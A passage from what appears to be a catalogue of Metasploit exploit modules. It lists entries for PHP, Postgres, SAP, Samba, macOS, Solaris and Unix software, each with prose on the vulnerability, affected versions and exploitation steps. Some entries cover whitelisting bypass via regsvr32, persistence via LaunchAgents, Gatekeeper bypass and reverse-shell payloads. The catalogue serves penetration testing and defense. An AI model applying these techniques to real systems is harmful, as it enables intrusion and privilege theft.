Ignition before 2.5.2, as used in Laravel and other products, allows unauthenticated remote attackers to execute arbitrary code because of insecure usage of file_get_contents() and file_put_contents(). This is exploitable on sites using debug mode with Laravel before 8.4.2.

multi/php/jorani_path_trav
This module exploits an unauthenticated Remote Code Execution in Jorani prior to 1.0.2. It abuses 3 vulnerabilities: log poisoning and redirection bypass via header spoofing, then it uses path traversal to trigger the vulnerability. It has been tested on Jorani 1.0.0.

multi/php/php_unserialize_zval_cookie
This module exploits an integer overflow vulnerability in the unserialize() function of the PHP web server extension. This vulnerability was patched by Stefan in version 4.5.0 and applies all previous versions supporting this function. This particular module targets numerous web applications and is based on the proof of concept provided by Stefan Esser. This vulnerability requires approximately 900k of data to trigger due the multiple Cookie headers requirement. Since we are already assuming a fast network connection, we use a 2Mb block of shellcode for the brute force, allowing quick exploitation for those with fast networks. One of the neat things about this vulnerability is that on x86 systems, the EDI register points into the beginning of the hashtable string. This can be used with an egghunter to quickly exploit systems where the location of a valid "jmp EDI" or "call EDI" instruction is known. The EDI method is faster, but the bandwidth-intensive brute force used by this module is more reliable across a wider range of systems.

multi/php/wp_duplicator_code_inject
When the WordPress plugin Snap Creek Duplicator restores a backup, it leaves dangerous files in the filesystem such as installer.php and installer-backup.php. These files allow anyone to call a function that overwrite the wp-config.php file AND this function does not sanitize POST parameters before inserting them inside the wp-config.php file, leading to arbitrary PHP code execution. WARNING: This exploit WILL break the wp-config.php file. If possible try to restore backups of the configuration after the exploit to make the WordPress site work again.

multi/postgres/postgres_copy_from_program_cmd_exec
Installations running Postgres 9.3 and above have functionality which allows for the superuser and users with 'pg_execute_server_program' to pipe to and from an external program using COPY. This allows arbitrary command execution as though you have console access. This module attempts to create a new table, then execute system commands in the context of copying the command output into the table. This module should work on all Postgres systems running version 9.3 and above. For Linux & OSX systems, target 1 is used with cmd payloads such as: cmd/unix/reverse_perl For Windows Systems, target 2 is used with powershell payloads such as: cmd/windows/powershell_reverse_tcp Alternativly target 3 can be used to execute generic commands, such as a web_delivery meterpreter powershell payload or other customised command.

multi/postgres/postgres_createlang
Some installations of Postgres 8 and 9 are configured to allow loading external scripting languages. Most commonly this is Perl and Python. When enabled, command execution is possible on the host. To execute system commands, loading the "untrusted" version of the language is necessary. This requires a superuser. This is usually postgres. The execution should be platform-agnostic, and has been tested on OS X, Windows, and Linux. This module attempts to load Perl or Python to execute system commands. As this dynamically loads a scripting language to execute commands, it is not necessary to drop a file on the filesystem. Only Postgres 8 and up are supported.

multi/realserver/describe
This module exploits a buffer overflow in RealServer 7/8/9 and was based on Johnny Cyberpunk's THCrealbad exploit. This code should reliably exploit Linux, BSD, and Windows-based servers.

multi/samba/nttrans
This module attempts to exploit a buffer overflow vulnerability present in versions 2.2.2 through 2.2.6 of Samba. The Samba developers report this as: "Bug in the length checking for encrypted password change requests from clients." The bug was discovered and reported by the Debian Samba Maintainers.

multi/samba/usermap_script
This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default "username map script" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!

multi/sap/cve_2020_6207_solman_rs
This module exploits the CVE-2020-6207 vulnerability within the SAP EEM servlet (tc~smd~agent~application~eem) of SAP Solution Manager (SolMan) running version 7.2. The vulnerability occurs due to missing authentication checks when submitting a SOAP request to the /EemAdminService/EemAdmin page to get information about connected SMDAgents, send HTTP request (SSRF) and execute OS command on connected SMDAgent. Works stable in connected SMDAgent with Java version 1.8. Successful exploitation will allow unauthenticated remote attackers to get reverse shell from connected to the SolMan agent as the user under which it runs SMDAgent service, usually daaadm.

multi/sap/sap_mgmt_con_osexec_payload
This module executes an arbitrary payload through the SAP Management Console SOAP Interface. A valid username and password for the SAP Management Console must be provided. This module has been tested successfully on both Windows and Linux platforms running SAP Netweaver. In order to exploit a Linux platform, the target system must have available the wget command.

multi/sap/sap_soap_rfc_sxpg_call_system_exec
This module abuses the SAP NetWeaver SXPG_CALL_SYSTEM function, on the SAP SOAP RFC Service, to execute remote commands. This module needs SAP credentials with privileges to use the /sap/bc/soap/rfc in order to work. The module has been tested successfully on Windows 2008 64-bit and Linux 64-bit platforms.

multi/sap/sap_soap_rfc_sxpg_command_exec
This module abuses the SAP NetWeaver SXPG_COMMAND_EXECUTE function, on the SAP SOAP RFC Service, to execute remote commands. This module needs SAP credentials with privileges to use the /sap/bc/soap/rfc in order to work. The module has been tested successfully on Windows 2008 64-bit and Linux 64-bit platforms.

multi/scada/inductive_ignition_rce
This module exploits a Java deserialization vulnerability in the Inductive Automation Ignition SCADA product, versions 8.0.0 to (and including) 8.0.7. This exploit was tested on versions 8.0.0 and 8.0.7 on both Linux and Windows. The default configuration is exploitable by an unauthenticated attacker, which can achieve remote code execution as SYSTEM on a Windows installation and root on Linux. The vulnerability was discovered and exploited at Pwn2Own Miami 2020 by the Flashback team (Pedro Ribeiro + Radek Domanski).

multi/script/web_delivery
This module quickly fires up a web server that serves a payload. The module will provide a command to be run on the target machine based on the selected target. The provided command will download and execute a payload using either a specified scripting language interpreter or "squiblydoo" via regsvr32.exe for bypassing application whitelisting. The main purpose of this module is to quickly establish a session on a target machine when the attacker has to manually type in the command: e.g. Command Injection, RDP Session, Local Access or maybe Remote Command Execution. This attack vector does not write to disk so it is less likely to trigger AV solutions and will allow privilege escalations supplied by Meterpreter. When using either of the PSH targets, ensure the payload architecture matches the target computer or use SYSWOW64 powershell.exe to execute x86 payloads on x64 machines. Regsvr32 uses "squiblydoo" technique to bypass application whitelisting. The signed Microsoft binary file, Regsvr32, is able to request an .sct file and then execute the included PowerShell command inside of it. Similarly, the pubprn target uses the pubprn.vbs script to request and execute a .sct file. Both web requests (i.e., the .sct file and PowerShell download/execute) can occur on the same port. The SyncAppvPublishingServer target uses SyncAppvPublishingServer.exe Microsoft signed binary to request and execute a PowerShell script. This technique only works on Windows 10 builds <= 1709. "PSH (Binary)" will write a file to the disk, allowing for custom binaries to be served up to be downloaded and executed.

multi/ssh/sshexec
This module connects to the target system and executes the necessary commands to run the specified payload via SSH. If a native payload is specified, an appropriate stager will be used.

multi/svn/svnserve_date
This is an exploit for the Subversion date parsing overflow. This exploit is for the svnserve daemon (svn:// protocol) and will not work for Subversion over webdav (http[s]://). This exploit should never crash the daemon, and should be safe to do multi-hits. **WARNING** This exploit seems to (not very often, I've only seen it during testing) corrupt the subversion database, so be careful!

multi/upnp/libupnp_ssdp_overflow
This module exploits a buffer overflow in the unique_service_name() function of libupnp's SSDP processor. The libupnp library is used across thousands of devices and is referred to as the Intel SDK for UPnP Devices or the Portable SDK for UPnP Devices. Due to size limitations on many devices, this exploit uses a separate TCP listener to stage the real payload.

multi/veritas/beagent_sha_auth_rce
Veritas Backup Exec Agent supports multiple authentication schemes and SHA authentication is one of them. This authentication scheme is no longer used within Backup Exec versions, but hadn’t yet been disabled. An attacker could remotely exploit the SHA authentication scheme to gain unauthorized access to the BE Agent and execute an arbitrary OS command on the host with NT AUTHORITY\SYSTEM or root privileges depending on the platform. The vulnerability presents in 16.x, 20.x and 21.x versions of Backup Exec up to 21.2 (or up to and including Backup Exec Remote Agent revision 9.3)

multi/vnc/vnc_keyboard_exec
This module exploits VNC servers by sending virtual keyboard keys and executing a payload. On Windows systems a command prompt is opened and a PowerShell or CMDStager payload is typed and executed. On Unix/Linux systems a xterm terminal is opened and a payload is typed and executed.

multi/vpn/tincd_bof
This module exploits a stack buffer overflow in Tinc's tincd service. After authentication, a specially crafted tcp packet (default port 655) leads to a buffer overflow and allows to execute arbitrary code. This module has been tested with tinc-1.1pre6 on Windows XP (custom calc payload) and Windows 7 (windows/meterpreter/reverse_tcp), and tinc version 1.0.19 from the ports of FreeBSD 9.1-RELEASE # 0 and various other OS, see targets. The exploit probably works for all versions <= 1.1pre6. A manually compiled version (1.1.pre6) on Ubuntu 12.10 with gcc 4.7.2 seems to be a non-exploitable crash due to calls to __memcpy_chk depending on how tincd was compiled. Bug got fixed in version 1.0.21/1.1pre7. While writing this module it was recommended to the maintainer to start using DEP/ASLR and other protection mechanisms.

multi/wyse/hagent_untrusted_hsdata
This module exploits the Wyse Rapport Hagent service by pretending to be a legitimate server. This process involves starting both HTTP and FTP services on the attacker side, then contacting the Hagent service of the target and indicating that an update is available. The target will then download the payload wrapped in an executable from the FTP service.

netware/smb/lsass_cifs
This module exploits a stack buffer overflow in the NetWare CIFS.NLM driver. Since the driver runs in the kernel space, a failed exploit attempt can cause the OS to reboot.

netware/sunrpc/pkernel_callit
This module exploits a stack buffer overflow in the NetWare PKERNEL.NLM driver's CALLIT procedure. PKERNEL.NLM is installed by default on all NetWare servers to support NFS. The PKERNEL.NLM module runs in kernel mode so a failed exploit attempt can cause the operating system to reboot.

openbsd/local/dynamic_loader_chpass_privesc
This module exploits a vulnerability in the OpenBSD `ld.so` dynamic loader (CVE-2019-19726). The `_dl_getenv()` function fails to reset the `LD_LIBRARY_PATH` environment variable when set with approximately `ARG_MAX` colons. This can be abused to load `libutil.so` from an untrusted path, using `LD_LIBRARY_PATH` in combination with the `chpass` set-uid executable, resulting in privileged code execution. This module has been tested successfully on: OpenBSD 6.1 (amd64); and OpenBSD 6.6 (amd64)

osx/afp/loginext
This module exploits a stack buffer overflow in the AppleFileServer service on MacOS X. This vulnerability was originally reported by Atstake and was actually one of the few useful advisories ever published by that company. You only have one chance to exploit this bug. This particular exploit uses a stack-based return address that will only work under optimal conditions.

osx/arkeia/type77
This module exploits a stack buffer overflow in the Arkeia backup client for the Mac OS X platform. This vulnerability affects all versions up to and including 5.3.3 and has been tested with Arkeia 5.3.1 on Mac OS X 10.3.5.

osx/browser/adobe_flash_delete_range_tl_op
This module exploits a type confusion on Adobe Flash Player, which was originally found being successfully exploited in the wild. This module has been tested successfully on: macOS Sierra 10.12.3, Safari and Adobe Flash Player 21.0.0.182, Firefox and Adobe Flash Player 21.0.0.182.

osx/browser/mozilla_mchannel
This module exploits a use-after-free vulnerability in Mozilla Firefox 3.6.16. An OBJECT element, mChannel, can be freed via the OnChannelRedirect method of the nsIChannelEventSink Interface. mChannel becomes a dangling pointer and can be reused when setting the OBJECTs data attribute. This module has been tested on Mac OS X 10.6.6, 10.6.7, 10.6.8, 10.7.2 and 10.7.3.

osx/browser/osx_gatekeeper_bypass
This module exploits two CVEs that bypass Gatekeeper. For CVE-2021-30657, this module serves an OSX app (as a zip) that contains no Info.plist, which bypasses gatekeeper in macOS < 11.3. If the user visits the site on Safari, the zip file is automatically extracted, and clicking on the downloaded file will automatically launch the payload. If the user visits the site in another browser, the user must click once to unzip the app, and click again in order to execute the payload. For CVE-2022-22616, this module serves a gzip-compressed zip file with its file header pointing to the `Contents` directory which contains an OSX app. If the user downloads the file via Safari, Safari will automatically decompress the file, removing its `com.apple.quarantine` attribute. Because of this, the file will not require quarantining, bypassing Gatekeeper on MacOS versions below 12.3.

osx/browser/safari_file_policy
This module exploits a vulnerability found in Apple Safari on OS X platform. A policy issue in the handling of file:// URLs may allow arbitrary remote code execution under the context of the user. In order to trigger arbitrary remote code execution, the best way seems to be opening a share on the victim machine first (this can be SMB/WebDav/FTP, or a file format that OS X might automount), and then execute it in /Volumes/[share]. If there's some kind of bug that leaks the victim machine's current username, then it's also possible to execute the payload in /Users/[username]/Downloads/, or else bruteforce your way to getting that information. Please note that non-java payloads (*.sh extension) might get launched by Xcode instead of executing it, in that case please try the Java ones instead.

osx/browser/safari_in_operator_side_effect
This module exploits an incorrect side-effect modeling of the 'in' operator. The DFG compiler assumes that the 'in' operator is side-effect free, however the <embed> element with the PDF plugin provides a callback that can trigger side-effects leading to type confusion (CVE-2020-9850). The type confusion can be used as addrof and fakeobj primitives that then lead to arbitrary read/write of memory. These primitives allow us to write shellcode into a JIT region (RWX memory) containing the next stage of the exploit. The next stage uses CVE-2020-9856 to exploit a heap overflow in CVM Server, and extracts a macOS application containing our payload into /var/db/CVMS. The payload can then be opened with CVE-2020-9801, executing the payload as a user but without sandbox restrictions.

osx/browser/safari_metadata_archive
This module exploits a vulnerability in Safari's "Safe file" feature, which will automatically open any file with one of the allowed extensions. This can be abused by supplying a zip file, containing a shell script, with a metafile indicating that the file should be opened by Terminal.app. This module depends on the 'zip' command-line utility.

osx/browser/safari_proxy_object_type_confusion
This module exploits a type confusion bug in the Javascript Proxy object in WebKit. The DFG JIT does not take into account that, through the use of a Proxy, it is possible to run arbitrary JS code during the execution of a CreateThis operation. This makes it possible to change the structure of e.g. an argument without causing a bailout, leading to a type confusion (CVE-2018-4233). The JIT region is then replaced with shellcode which loads the second stage. The second stage exploits a logic error in libxpc, which uses command execution via the launchd's "spawn_via_launchd" API (CVE-2018-4404).

osx/browser/safari_user_assisted_applescript_exec
In versions of Mac OS X before 10.11.1, the applescript:// URL scheme is provided, which opens the provided script in the Applescript Editor. Pressing cmd-R in the Editor executes the code without any additional confirmation from the user. By getting the user to press cmd-R in Safari, and by hooking the cmd-key keypress event, a user can be tricked into running arbitrary Applescript code. Gatekeeper should be disabled from Security & Privacy in order to avoid the unidentified Developer prompt.

osx/browser/safari_user_assisted_download_launch
This module abuses some Safari functionality to force the download of a zipped .app OSX application containing our payload. The app is then invoked using a custom URL scheme. At this point, the user is presented with Gatekeeper's prompt: "APP_NAME" is an application downloaded from the internet. Are you sure you want to open it? If the user clicks "Open", the app and its payload are executed. If the user has the "Only allow applications downloaded from Mac App Store and identified developers (on by default on OS 10.8+), the user will see an error dialog containing "can't be opened because it is from an unidentified developer." To work around this issue, you will need to manually build and sign an OSX app containing your payload with a custom URL handler called "openurl". You can put newlines and unicode in your APP_NAME, although you must be careful not to create a prompt that is too tall, or the user will not be able to click the buttons, and will have to either logout or kill the CoreServicesUIAgent process.

osx/browser/software_update
This module exploits a feature in the Distribution Packages, which are used in the Apple Software Update mechanism. This feature allows for arbitrary command execution through JavaScript. This exploit provides the malicious update server. Requests must be redirected to this server by other means for this exploit to work.

osx/email/mailapp_image_exec
This module exploits a command execution vulnerability in the Mail.app application shipped with Mac OS X 10.5.0. This flaw was patched in 10.4 in March of 2007, but reintroduced into the final release of 10.5.

osx/ftp/webstar_ftp_user
This module exploits a stack buffer overflow in the logging routine of the WebSTAR FTP server. Reliable code execution is obtained by a series of hops through the System library.

osx/http/evocam_webserver
This module exploits a stack buffer overflow in the web server provided with the EvoCam program for Mac OS X. We use Dino Dai Zovi's exec-from-heap technique to copy the payload from the non-executable stack segment to heap memory. Vulnerable versions include 3.6.6, 3.6.7, and possibly earlier versions as well. EvoCam version 3.6.8 fixes the vulnerability.

osx/local/acronis_trueimage_xpc_privesc
Acronis TrueImage versions 2019 update 1 through 2021 update 1 are vulnerable to privilege escalation. The `com.acronis.trueimagehelper` helper tool does not perform any validation on connecting clients, which gives arbitrary clients the ability to execute functions provided by the helper tool with `root` privileges.

osx/local/cfprefsd_race_condition
This module exploits an arbitrary file write in cfprefsd on macOS <= 10.15.4 in order to run a payload as root. The CFPreferencesSetAppValue function, which is reachable from most unsandboxed processes, can be exploited with a race condition in order to overwrite an arbitrary file as root. By overwriting /etc/pam.d/login a user can then login as root with the `login root` command without a password.

osx/local/dyld_print_to_file_root
In Apple OS X 10.10.4 and prior, the DYLD_PRINT_TO_FILE environment variable is used for redirecting logging data to a file instead of stderr. Due to a design error, this feature can be abused by a local attacker to write arbitrary files as root via restricted, SUID-root binaries.

osx/local/feedback_assistant_root
This module exploits a race condition vulnerability in Mac's Feedback Assistant. A successful attempt would result in remote code execution under the context of root.

osx/local/iokit_keyboard_root
A heap overflow in IOHIKeyboardMapper::parseKeyMapping allows kernel memory corruption in Mac OS X before 10.10. By abusing a bug in the IORegistry, kernel pointers can also be leaked, allowing a full kASLR bypass. Tested on Mavericks 10.9.5, and should work on previous versions. The issue was patched silently in Yosemite.

osx/local/libxpc_mitm_ssudo
This module exploits a vulnerablity in libxpc on macOS <= 10.13.3 The task_set_special_port API allows callers to overwrite their bootstrap port, which is used to communicate with launchd. This port is inherited across forks: child processes will use the same bootstrap port as the parent. By overwriting the bootstrap port and forking a child processes, we can now gain a MitM position between our child and launchd. To gain root we target the sudo binary and intercept its communication with opendirectoryd, which is used by sudo to verify credentials. We modify the replies from opendirectoryd to make it look like our password was valid.

osx/local/mac_dirty_cow
An app may be able to execute arbitrary code with kernel privileges

osx/local/nfs_mount_root
This exploit leverages a stack buffer overflow vulnerability to escalate privileges. The vulnerable function nfs_convert_old_nfs_args does not verify the size of a user-provided argument before copying it to the stack. As a result, by passing a large size as an argument, a local user can overwrite the stack with arbitrary content. Mac OS X Lion Kernel <= xnu-1699.32.7 except xnu-1699.24.8 are affected.

osx/local/persistence
This module provides a persistent boot payload by creating a plist entry in current user's ~/Library/LaunchAgents directory. Whenever the user logs in, the LaunchAgent will be invoked and this dropped payload will run.

osx/local/root_no_password
This module exploits a serious flaw in MacOSX High Sierra. Any user can login with user "root", leaving an empty password.

osx/local/rootpipe
This module exploits a hidden backdoor API in Apple's Admin framework on Mac OS X to escalate privileges to root, dubbed "Rootpipe." This module was tested on Yosemite 10.10.2 and should work on previous versions. The patch for this issue was not backported to older releases. Note: you must run this exploit as an admin user to escalate to root.

osx/local/rootpipe_entitlements
This module exploits the rootpipe vulnerability and bypasses Apple's initial fix for the issue by injecting code into a process with the 'admin.writeconfig' entitlement.

osx/local/rsh_libmalloc
This module writes to the sudoers file without root access by exploiting rsh and malloc log files. Makes sudo require no password, giving access to su even if root is disabled. Works on OS X 10.9.5 to 10.10.5 (patched on 10.11).

osx/local/setuid_tunnelblick
This module exploits a vulnerability in Tunnelblick 3.2.8 on Mac OS X. The vulnerability exists in the setuid openvpnstart, where an insufficient validation of path names allows execution of arbitrary shell scripts as root. This module has been tested successfully on Tunnelblick 3.2.8 build 2891.3099 over Mac OS X 10.7.5.

osx/local/setuid_viscosity
This module exploits a vulnerability in Viscosity 1.4.1 on Mac OS X. The vulnerability exists in the setuid ViscosityHelper, where an insufficient validation of path names allows execution of arbitrary python code as root. This module has been tested successfully on Viscosity 1.4.1 over Mac OS X 10.7.5.

osx/local/sudo_password_bypass
This module gains a session with root permissions on versions of OS X with sudo binary vulnerable to CVE-2013-1775. Tested working on Mac OS 10.7-10.8.4, and possibly lower versions. If your session belongs to a user with Administrative Privileges (the user is in the sudoers file and is in the "admin group"), and the user has ever run the "sudo" command, it is possible to become the super user by running `sudo -k` and then resetting the system clock to 01-01-1970. This module will fail silently if the user is not an admin, if the user has never run the sudo command, or if the admin has locked the Date/Time preferences. Note: If the user has locked the Date/Time preferences, requests to overwrite the system clock will be ignored, and the module will silently fail. However, if the "Require an administrator password to access locked preferences" setting is not enabled, the Date/Time preferences are often unlocked every time the admin logs in, so you can install persistence and wait for a chance later.

osx/local/timemachine_cmd_injection
This module exploits a command injection in TimeMachine on macOS <= 10.14.3 in order to run a payload as root. The tmdiagnose binary on OSX <= 10.14.3 suffers from a command injection vulnerability that can be exploited by creating a specially crafted disk label. The tmdiagnose binary uses awk to list every mounted volume, and composes shell commands based on the volume labels. By creating a volume label with the backtick character, we can have our own binary executed with root priviledges.

osx/local/tpwn
This module exploits a null pointer dereference in XNU to escalate privileges to root. Tested on 10.10.4 and 10.10.5.

osx/local/vmware_bash_function_root
This module exploits the Shellshock vulnerability, a flaw in how the Bash shell handles external environment variables. This module targets the VMWare Fusion application, allowing an unprivileged local user to get root access.

osx/local/vmware_fusion_lpe
This exploits an improper use of setuid binaries within VMware Fusion 10.1.3 - 11.5.3. The Open VMware USB Arbitrator Service can be launched outide of its standard path which allows loading of an attacker controlled binary. By creating a payload in the user home directory in a specific folder, and creating a hard link to the 'Open VMware USB Arbitrator Service' binary, we're able to launch it temporarily to start our payload with an effective UID of 0. @jeffball55 discovered an incomplete patch in 11.5.3 with a TOCTOU race. Successfully tested against 10.1.6, 11.5.1, 11.5.2, and 11.5.3.

osx/mdns/upnp_location
This module exploits a buffer overflow that occurs when processing specially crafted requests set to mDNSResponder. All Mac OS X systems between version 10.4 and 10.4.9 (without the 2007-005 patch) are affected.

osx/misc/ufo_ai
This module exploits a buffer overflow in the IRC client component of UFO: Alien Invasion 2.2.1.

osx/rtsp/quicktime_rtsp_content_type
This module exploits a stack-based buffer overflow in Apple QuickTime before version 7.3.1. By sending an overly long RTSP response to a client, an attacker may be able to execute arbitrary code.

osx/samba/lsa_transnames_heap
This module triggers a heap overflow in the LSA RPC service of the Samba daemon. This module uses the szone_free() to overwrite the size() or free() pointer in initial_malloc_zones structure.

osx/samba/trans2open
This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the bug on Mac OS X PowerPC systems.

qnx/local/ifwatchd_priv_esc
This module attempts to gain root privileges on QNX 6.4.x and 6.5.x systems by exploiting the ifwatchd suid executable. ifwatchd allows users to specify scripts to execute using the '-A' command line argument; however, it does not drop privileges when executing user-supplied scripts, resulting in execution of arbitrary commands as root. This module has been tested successfully on QNX Neutrino 6.5.0 (x86) and 6.5.0 SP1 (x86).

qnx/qconn/qconn_exec
This module uses the qconn daemon on QNX systems to gain a shell. The QNX qconn daemon does not require authentication and allows remote users to execute arbitrary operating system commands. This module has been tested successfully on QNX Neutrino 6.5.0 (x86) and 6.5.0 SP1 (x86).

solaris/dtspcd/heap_noir
This is a port of noir's dtspcd exploit. This module should work against any vulnerable version of Solaris 8 (sparc). The original exploit code was published in the book Shellcoder's Handbook.

solaris/local/extremeparr_dtappgather_priv_esc
This module exploits a directory traversal vulnerability in the `dtappgather` executable included with Common Desktop Environment (CDE) on unpatched Solaris systems prior to Solaris 10u11 which allows users to gain root privileges. dtappgather allows users to create a user-owned directory at any location on the filesystem using the `DTUSERSESSION` environment variable. This module creates a directory in `/usr/lib/locale`, writes a shared object to the directory, and runs the specified SUID binary with the shared object loaded using the `LC_TIME` environment variable. This module has been tested successfully on: Solaris 9u7 (09/04) (x86); Solaris 10u1 (01/06) (x86); Solaris 10u2 (06/06) (x86); Solaris 10u4 (08/07) (x86); Solaris 10u8 (10/09) (x86); Solaris 10u9 (09/10) (x86).

solaris/local/libnspr_nspr_log_file_priv_esc
This module exploits an arbitrary file write vulnerability in the Netscape Portable Runtime library (libnspr) on unpatched Solaris systems prior to Solaris 10u3 which allows users to gain root privileges. libnspr versions prior to 4.6.3 allow users to specify a log file with the `NSPR_LOG_FILE` environment variable. The log file is created with the privileges of the running process, resulting in privilege escalation when used in combination with a SUID executable. This module writes a shared object to the trusted library directory `/usr/lib/secure` and runs the specified SUID binary with the shared object loaded using the `LD_LIBRARY_PATH` environment variable. This module has been tested successfully with libnspr version 4.5.1 on Solaris 10u1 (01/06) (x86) and Solaris 10u2 (06/06) (x86).

solaris/local/rsh_stack_clash_priv_esc
This module exploits a vulnerability in RSH on unpatched Solaris systems which allows users to gain root privileges. The stack guard page on unpatched Solaris systems is of insufficient size to prevent collisions between the stack and heap memory, aka Stack Clash. This module uploads and executes Qualys' Solaris_rsh.c exploit, which exploits a vulnerability in RSH to bypass the stack guard page to write to the stack and create a SUID root shell. This module has offsets for Solaris versions 11.1 (x86) and Solaris 11.3 (x86). Exploitation will usually complete within a few minutes using the default number of worker threads (10). Occasionally, exploitation will fail. If the target system is vulnerable, usually re-running the exploit will be successful. This module has been tested successfully on Solaris 11.1 (x86) and Solaris 11.3 (x86).

solaris/local/xscreensaver_log_priv_esc
This module exploits a vulnerability in `xscreensaver` versions since 5.06 on unpatched Solaris 11 systems which allows users to gain root privileges. `xscreensaver` allows users to create a user-owned file at any location on the filesystem using the `-log` command line argument introduced in version 5.06. This module uses `xscreensaver` to create a log file in `/usr/lib/secure/`, overwrites the log file with a shared object, and executes the shared object using the `LD_PRELOAD` environment variable. This module has been tested successfully on: xscreensaver version 5.15 on Solaris 11.1 (x86); and xscreensaver version 5.15 on Solaris 11.3 (x86).

solaris/lpd/sendmail_exec
This module exploits an arbitrary command execution flaw in the in.lpd service shipped with all versions of Sun Solaris up to and including 8.0. This module uses a technique discovered by Dino Dai Zovi to exploit the flaw without needing to know the resolved name of the attacking system.

solaris/samba/lsa_transnames_heap
This module triggers a heap overflow in the LSA RPC service of the Samba daemon. This module uses the TALLOC chunk overwrite method (credit Ramon and Adriano), which only works with Samba versions 3.0.21-3.0.24. Additionally, this module will not work when the Samba "log level" parameter is higher than "2".

solaris/samba/trans2open
This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the flaw on Solaris SPARC systems that do not have the noexec stack option set. Big thanks to MC and valsmith for resolving a problem with the beta version of this module.

solaris/ssh/pam_username_bof
This module exploits a stack-based buffer overflow in the Solaris PAM library's username parsing code, as used by the SunSSH daemon when the keyboard-interactive authentication method is specified. Tested against SunSSH 1.1.5 on Solaris 10u11 1/13 (x86) in VirtualBox, VMware Fusion, and VMware Player. Bare metal untested. Your addresses may vary.

solaris/sunrpc/sadmind_adm_build_path
This module exploits a buffer overflow vulnerability in adm_build_path() function of sadmind daemon. The distributed system administration daemon (sadmind) is the daemon used by Solstice AdminSuite applications to perform distributed system administration operations. The sadmind daemon is started automatically by the inetd daemon whenever a request to invoke an operation is received. The sadmind daemon process continues to run for 15 minutes after the last request is completed, unless a different idle-time is specified with the -i command line option. The sadmind daemon may be started independently from the command line, for example, at system boot time. In this case, the -i option has no effect; sadmind continues to run, even if there are no active requests.

solaris/sunrpc/sadmind_exec
This exploit targets a weakness in the default security settings of the sadmind RPC application. This server is installed and enabled by default on most versions of the Solaris operating system. Vulnerable systems include solaris 2.7, 8, and 9

solaris/sunrpc/ypupdated_exec
This exploit targets a weakness in the way the ypupdated RPC application uses the command shell when handling a MAP UPDATE request. Extra commands may be launched through this command shell, which runs as root on the remote host, by passing commands in the format '|<command>'. Vulnerable systems include Solaris 2.7, 8, 9, and 10, when ypupdated is started with the '-i' command-line option.

solaris/telnet/fuser
This module exploits the argument injection vulnerability in the telnet daemon (in.telnetd) of Solaris 10 and 11.

solaris/telnet/ttyprompt
This module uses a buffer overflow in the Solaris 'login' application to bypass authentication in the telnet daemon.

unix/dhcp/bash_environment
This module exploits the Shellshock vulnerability, a flaw in how the Bash shell handles external environment variables. This module targets dhclient by responding to DHCP requests with a malicious hostname, domainname, and URL which are then passed to the configuration scripts as environment variables, resulting in code execution. Due to length restrictions and the unusual networking scenario at the time of exploitation, this module achieves code execution by writing the payload into /etc/crontab and then cleaning it up after a session is created.

unix/dhcp/rhel_dhcp_client_command_injection
This module exploits the DynoRoot vulnerability, a flaw in how the NetworkManager integration script included in the DHCP client in Red Hat Enterprise Linux 6 and 7, Fedora 28, and earlier processes DHCP options. A malicious DHCP server, or an attacker on the local network able to spoof DHCP responses, could use this flaw to execute arbitrary commands with root privileges on systems using NetworkManager and configured to obtain network configuration using the DHCP protocol.

unix/fileformat/exiftool_djvu_ant_perl_injection
This module exploits a Perl injection vulnerability in the DjVu ANT parsing code of ExifTool versions 7.44 through 12.23 inclusive. The injection is used to execute a shell command using Perl backticks. The DjVu image can be embedded in a wrapper image using the HasselbladExif EXIF field.

unix/fileformat/ghostscript_type_confusion
This module exploits a type confusion vulnerability in Ghostscript that can be exploited to obtain arbitrary command execution. This vulnerability affects Ghostscript versions 9.21 and earlier and can be exploited through libraries such as ImageMagick and Pillow.

unix/fileformat/imagemagick_delegate
This module exploits a shell command injection in the way "delegates" (commands for converting files) are processed in ImageMagick versions <= 7.0.1-0 and <= 6.9.3-9 (legacy). Since ImageMagick uses file magic to detect file format, you can create a .png (for example) which is actually a crafted SVG (for example) that triggers the command injection. The PostScript (PS) target leverages a Ghostscript -dSAFER bypass (discovered by taviso) to achieve RCE in the Ghostscript delegate. Ghostscript versions 9.18 and later are affected. This target is provided as is and will not be updated to track additional vulns. If USE_POPEN is set to true, a |-prefixed command will be used for the exploit. No delegates are involved in this exploitation.

unix/fileformat/metasploit_libnotify_cmd_injection
This module exploits a shell command injection vulnerability in the libnotify plugin. This vulnerability affects Metasploit versions 5.0.79 and earlier.

unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
This module exploits a command injection vulnerability in Metasploit Framework's msfvenom payload generator when using a crafted APK file as an Android payload template. Affects Metasploit Framework <= 6.0.11 and Metasploit Pro <= 4.18.0. The file produced by this module is a relatively empty yet valid-enough APK file. To trigger the vulnerability, the victim user should do the following: msfvenom -p android/<...> -x <crafted_file.apk>

unix/ftp/proftpd_133c_backdoor
This module exploits a malicious backdoor that was added to the ProFTPD download archive. This backdoor was present in the proftpd-1.3.3c.tar.[bz2|gz] archive between November 28th 2010 and 2nd December 2010.

unix/ftp/proftpd_modcopy_exec
This module exploits the SITE CPFR/CPTO mod_copy commands in ProFTPD version 1.3.5. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination. The copy commands are executed with the rights of the ProFTPD service, which by default runs under the privileges of the 'nobody' user. By using /proc/self/cmdline to copy a PHP payload to the website directory, PHP remote code execution is made possible.

unix/ftp/vsftpd_234_backdoor
This module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011.

unix/http/cacti_filter_sqli_rce
This module exploits a SQL injection vulnerability in Cacti 1.2.12 and before. An admin can exploit the filter variable within color.php to pull arbitrary values as well as conduct stacked queries. With stacked queries, the path_php_binary value is changed within the settings table to a payload, and an update is called to execute the payload. After calling the payload, the value is reset.

unix/http/contentkeeperweb_mimencode
This module exploits the ContentKeeper Web Appliance. Versions prior to 125.10 are affected. This module exploits a combination of weaknesses to enable remote command execution as the Apache user. By setting SkipEscalation to false, this module will attempt to setuid the bash shell.

unix/http/ctek_skyrouter
This module exploits an unauthenticated remote root exploit within ctek SkyRouter 4200 and 4300.

